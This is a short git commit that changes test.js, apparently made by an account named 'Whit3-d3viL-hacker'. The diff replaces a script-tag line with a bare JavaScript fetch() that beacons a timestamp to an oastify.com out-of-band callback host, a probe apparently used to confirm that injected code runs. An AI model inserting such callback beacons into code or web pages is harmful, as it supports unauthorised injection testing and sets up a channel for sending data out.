fb3ccd0e289fa38842a4a4a3dfdf9c45c5b49cb5
Whit3-d3viL-hacker <160129838+Whit3-d3viL-hacker@users.noreply.github.com>
2025-08-18 21:57:39 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-<script>fetch("https://jylrsh1e268ta1mk7j6v4xstokubi16q.oastify.com/log?time=" + Date.now()); <script>
+fetch("https://jylrsh1e268ta1mk7j6v4xstokubi16q.oastify.com/log?time=" + Date.now());
